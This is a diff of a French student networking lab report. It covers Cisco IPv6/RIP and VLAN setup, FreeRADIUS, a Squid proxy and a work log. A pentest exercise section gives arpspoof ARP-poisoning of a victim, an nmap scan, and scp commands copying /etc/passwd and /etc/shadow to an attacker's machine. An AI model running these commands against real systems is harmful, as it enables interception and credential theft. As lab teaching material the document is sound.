-SE2A5-R1(config-router)#exit
-```
-* VLAN 530 :
-```
-SE2A5-R1(config)#interface vlan 530
-SE2A5-R1(config-if)#ipv6 address fe80::2 link-local
-SE2A5-R1(config-if)#ipv6 rip tpima2a5 enable
-SE2A5-R1(config-if)#ipv6 enable
-```
-* VLAN 110 :
-```
-SE2A5-R1(config)#interface vlan 110
-SE2A5-R1(config-if)#ipv6 address 2001:660:4401:60a0::/64 eui-64
-SE2A5-R1(config-if)#ipv6 nd prefix 2001:660:4401:60a0::/64 1000 900
-SE2A5-R1(config-if)#ipv6 nd router-preference high
-SE2A5-R1(config-if)#ipv6 enable
-SE2A5-R1(config-if)#exit
-```
-
-### &ensp; &rarr; **Cisco Catalyst 9200**
-
-* Routage IPv6 - Protocole RIPv6 :
-```
-SE2A5-R2(config)#ipv6 router rip tpima2a5
-SE2A5-R2(config-router)#redistribute connected metric 2
-SE2A5-R2(config-router)#redistribute rip 1 metric 2
-SE2A5-R2(config-router)#redistribute static metric 2
-SE2A5-R2(config-router)#exit
-```
-* VLAN 530 :
-```
-SE2A5-R2(config)#interface vlan 530
-SE2A5-R2(config-if)#ipv6 address fe80::3 link-local
-SE2A5-R2(config-if)#ipv6 rip tpima2a5 enable
-SE2A5-R2(config-if)#ipv6 enable
-SE2A5-R2(config-if)#exit
-```
-* VLAN 110 :
-```
-SE2A5-R2(config)#interface vlan 110
-SE2A5-R2(config-if)#ipv6 address 2001:660:4401:60a0::/64 eui-64
-SE2A5-R2(config-if)#ipv6 nd prefix 2001:660:4401:60a0::/64 1000 900
-SE2A5-R2(config-if)#ipv6 nd router-preference medium
-SE2A5-R2(config-if)#ipv6 enable
-SE2A5-R2(config-if)#exit
-```
-
-### &ensp; &rarr; **Cisco ISR 4331**
-
-* Bridge VLAN 532 :
-```
-SE2A5-R3(config)#interface bdi 532
-SE2A5-R3(config-if)#ipv6 enable
-SE2A5-R3(config-if)#exit
-```
-*  Bridge VLAN 110 :
-```
-SE2A5-R3(config)#interface bdi 110
-SE2A5-R3(config-if)#ipv6 enable
-SE2A5-R3(config-if)#ipv6 nd router-preference low
-SE2A5-R3(config-if)#exit
 ```
 
 # Machine virtuelle sur le serveur Capbreton
@@ -1431,7 +1444,9 @@ dnssec-verify -o demineur.site db.demineur.site.signed
 service bind9 restart
 ```
 
-## Configuration de RADIUS (Points d'accès WPA-EAP)
+## Configuration du serveur RADIUS
+
+Le serveur RADIUS permet l'authentification des utilisateurs qui se connectent aux points d'accès Wifi (WPA-EAP).
 
 * Installer le paquet `freeradius` :
 ```
@@ -1479,6 +1494,57 @@ Si la connexion est validée alors la configuration est correcte. Dans ce cas, a
 * Redémarrer le service `freeradius` :
 ```
 service freeradius start
+```
+
+## Configuration de Squid (serveur mandataire)
+
+Pour permettre aux utilisateurs connectés aux réseaux Wifi d'avoir un accès à Internet, on configure un serveur mandataire (proxy).
+
+* Installer le paquet `squid` :
+```
+apt install squid
+```
+
+* Faire une sauvegarde de la configuration de `squid` :
+```
+cp /etc/squid/squid.conf /etc/squid/squid.conf.bak
+```
+
+* Nettoyer le fichier de configuration de `squid` en retirant les commentaires :
+```
+grep -vE "^#|^$" /etc/squid/squid.conf.bak > /etc/squid/squid.conf
+```
+
+* Modifier le fichier de configuration de `squid` :
+```
+vi /etc/squid/squid.conf
+```
+
+* Ajouter en dessous de la ligne `acl localhost src` une liste d'accès pour autoriser le réseau privé à utiliser le proxy :
+```
+acl allowedips src 10.60.164.0/24
+```
+
+* Ajouter la ligne suivante en dessous de la ligne `http_access allow localhost` :
+```
+http_access allow allowedips
+```
+
+* Configurer le nom de la machine :
+```
+visible_hostname demineur
+```
+
+* Ne pas inclure l'adresse IP dans les requêtes HTTP :
+```
+forwarded_for off
+```
+
+* Sauvegarder et quitter le fichier de configuration
+
+* Redémarrage du service `squid` :
+```
+service squid restart
 ```
 
 ## Sécurisation des données
@@ -1758,7 +1824,7 @@ sysctl -w net.ipv4.ip_forward=1
 
 * Lancer l'empoisonnement du cache ARP de la victime :
 ```
-arpspoof -i {Nom carte réseau} -t {Adresse IP victime} {Adresse IP passerelle}
+arpspoof -i <Nom carte réseau> -t <Adresse IP victime> <Adresse IP passerelle>
 ```
 
 * Vérifier la contamination du cache ARP sur la machine de la victime :
@@ -1812,18 +1878,18 @@ apt-get install nmap
 
 * Vérifier que le serveur est accessible à distance (analyse des ports) :
 ```
-nmap -6 https://{Adresse du serveur}
+nmap -6 https://<Adresse du serveur>
 ```
 
 * Se connecter au serveur via `ssh` avec les identifiants récupérés dans la base de données :
 ```
-ssh {Utilisateur}@{Adresse du serveur}
+ssh <Utilisateur>@<Adresse du serveur>
 ```
 
 * Récupération des informations sur les utilisateurs :
 ```
-scp /etc/passwd {Utilisateur pirate}@{Adresse machine pirate}:~/passwd
-scp /etc/shadow {Utilisateur pirate}@{Adresse machine pirate}:~/shadow
+scp /etc/passwd <Utilisateur pirate>@<Adresse machine pirate>:~/passwd
+scp /etc/shadow <Utilisateur pirate>@<Adresse machine pirate>:~/shadow
 ```
 
 ### Cassage du mot de passe root
@@ -1927,7 +1993,14 @@ sed -i 's/\(.*\)/\1\1/' dico
 ## Lundi 29/11/2021 08h-12h
 
 ### Tâches effectuées :
-
+* Configuration IPv6
+  * Communication fonctionnelle entre les réseaux créés et ceux de la plateforme maths/info
+  * Communication impossible avec Internet (IPv6) à cause de la configuration des routeurs de l'université
+* Configuration ISR 4331
+* Configuration Wifi EAP
+  * Adressage DHCP fonctionnel pour les appareils Wifi
+  * Communication fonctionnelle entre les appareils Wifi connectés et les autres équipements
+  * Configuration d'un serveur Proxy pour donner aux appareils Wifi un accès à Internet
 
 ## Vendredi 03/12/2021 08h-10h
 
